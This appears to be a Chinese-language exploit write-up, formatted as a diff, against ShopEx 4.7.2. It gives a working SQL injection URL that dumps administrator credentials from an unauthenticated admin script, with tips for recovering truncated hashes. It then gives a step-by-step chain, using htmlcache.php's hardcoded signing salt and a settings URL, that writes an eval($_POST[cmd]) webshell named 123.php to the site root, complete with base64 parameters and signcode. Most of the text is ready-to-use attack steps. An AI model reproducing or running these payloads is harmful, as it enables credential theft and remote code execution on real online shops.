@@ -1,0 +1,80 @@
+这是一个shopex4.7.2漏洞，已经通知了官方，今天就发出来，
+
+首先syssite/shopadmin/order_service.php后台这个文件没有验证用户身份，
+
+重要的是$v_id参数没有过滤
+
+syssite/shopadmin/order_service.php?m_id=1&key=986078fbe1474d61464d08535f1002a8&&v_id=1 and 1=2 union select concat(username,0x20,userpass),2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4 from sdb_mall_offer_operater%23
+
+直接获取管理员账号密码md5自己解，字段数不对用order by 猜，
+
+有的站只能显示出来前14位，就用left(password,14) mid(password,15,4) right(password,14) 合起来就是完整的32位密码了
+
+如果表名改了,mysql 5.0以上版本自己爆，相关内容不再叙述
+
+登陆后台，接下来讲shell获取部分，(普通管理员一样利用)
+
+分析根目录下htmlcache.php
+
+分析代码的朋友注意了，
+
+$url = base64_decode( $_GET['url'] );
+$filename = base64_decode( $_GET['filename'] );
+$signcode = $_GET['signcode'];
+$verifycode = md5( $url.$filename."1e236443e5a30b09910e0d48c994b8e6" );
+if ( $_cvar['seoCacheTime'] == "0" )
+{
+exit( );
+
+}
+
+变量 url  filename 提交的时候用base64 加密，
+
+下面几句
+
+if ( $_cvar['seoCacheTime'] == "0" )
+{
+exit( );
+}
+if ( substr( $filename, 0, 3 ) == "../" )
+{
+exit( );
+}
+if ( $verifycode != $signcode )
+{
+exit( );
+}
+
+$filename 不能有 ../
+
+$verifycode 要等于$signcode
+
+$_cvar['seoCacheTime'] 在syssite\home\shop\1\shop.cache.php有定义，默认是0
+
+前面几个很容易就绕过去了，$_cvar['seoCacheTime'] 我在后台里一直没有找到在哪里设置，
+
+分析代码发现，进入后台，直接在url后面输入syssite/shopadmin/admin_seo_act.php?act=savecachetime&seocachetime=60
+
+设置seocachetime为60
+
+好了，条件满足，开始获取shell
+
+base64分别加密
+http://你的url/test.txt 为$url变量，()
+123.php         为$filename变量
+$signcode是url filename 1e236443e5a30b09910e0d48c994b8e6 的32位md5值
+
+其实url完全不用获取test.txt内容的，有时候会获取不成功，
+url直接写成http://www.baidu.com/<?php eval($_POST[cmd]);?> base64加密就行了
+
+加密结果
+
+url   aHR0cDovL3d3dy5iYWlkdS5jb20vPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=
+filename MTIzLnBocA==
+signcode 186350a50934cb17b9bc47f5e067adbe
+
+最后提交
+
+htmlcache.php?url=aHR0cDovL3d3dy5iYWlkdS5jb20vPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=&filename=MTIzLnBocA==&signcode=186350a50934cb17b9bc47f5e067adbe
+
+直接在根目录生成123.php内容为一句话后门，密码cmd
